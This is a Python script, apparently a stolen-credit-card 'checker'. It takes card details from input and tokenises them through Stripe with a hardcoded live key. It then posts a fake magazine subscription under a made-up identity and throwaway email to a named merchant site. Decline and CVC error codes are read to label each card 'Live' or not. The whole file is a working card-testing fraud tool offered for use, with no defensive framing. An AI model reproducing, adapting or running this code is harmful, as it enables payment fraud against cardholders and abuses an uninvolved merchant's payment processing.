import requests
import string
import random
import json
import re
import os, sys, time, io,re
N = 10

rnd = ''.join(random.choices(string.ascii_lowercase + string.digits, k = N))



def pregs(list):
    arrays = re.findall(r'[0-9]+', list)
    return arrays
cardt = input('Enter CC: ')
print(" ")
os.system("clear")
print("Checking Card!")
print(" ")
arrs = pregs(cardt)
cc = arrs[0]
mes = arrs[1]
ano = arrs[2]
cvv = arrs[3]
bin = cc[:6]

email = (str(rnd))+'@gmail.com'

payload = {
      "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
      "card[name]": "Juan Del Monte",
      "card[number]": cc,                                                    "card[exp_month]": mes,
      "card[exp_year]": ano,
      "card[cvc]": cvv
    }

head = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "application/json",
      "Origin": "https://js.stripe.com/",
      "Referer": "https://js.stripe.com/",
      "Accept-Language": "en-US,en;q=0.9"
        }

rsem = requests.post("https://api.stripe.com/v1/tokens",data=payload, headers=head)
json_first = json.loads(rsem.text)
token = json_first["id"]

load = {
      "subscription_type": "digital",
      "first_name": "Juan",
      "last_name": "del Monte",
      "email": email,
      "login_pass": "juanitoejzjzjjz",
      "confirm_pass": "juanitoejzjzjjz",
      "shipping_country": "United+States",
      "card_number": cc,
      "card_cvc": cvv,
      "card_expiry_month": mes,
      "card_expiry_year": ano,
      "action": "register",
      "stripe_token": token,
      "last4": token
                                }


header = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "Accept": "application/json",
      "Origin": "https://preludemag.com",
      "Referer": "https://preludemag.com",
      "Accept-Language": "en-US,en;q=0.9"
                                }
req = requests.post("https://preludemag.com/subscribe/",headers=header,data=load)

decode = req.text

if 'invalid_cvc'in req.text:
    print("Card: "+cardt+" |BY @YHVGAAA")
    print('Message:'+decode)
    print('Live: True!')


elif 'incorrect_cvc'in req.text:
    print("CC: "+cardt+" |BY @YHVGAAA")
    print('Message:'+decode)
    print('Live: True!')


elif 'decline_code' in req.text:
    print("CC: "+cardt+" |BY @YHVGAAA")
    print('Message:'+decode)
    print("Live: False!")

elif 'autentication_required' in req.text:
    print("CC: "+cardt+" |BY @YHVGAAA")
    print('Message:'+decode)
    print("Live: False!")

elif 'declined' in req.text:
    print("CC: "+cardt+"   |BY @YHVGAAA")
    print('Message:'+decode)
    print("Live: False!")

else:
    print("CARD ERROR, PLEASE REPORT @YHVGAAA")
    print("Request: "+decode)

print(" ")
print("checker finalized!")
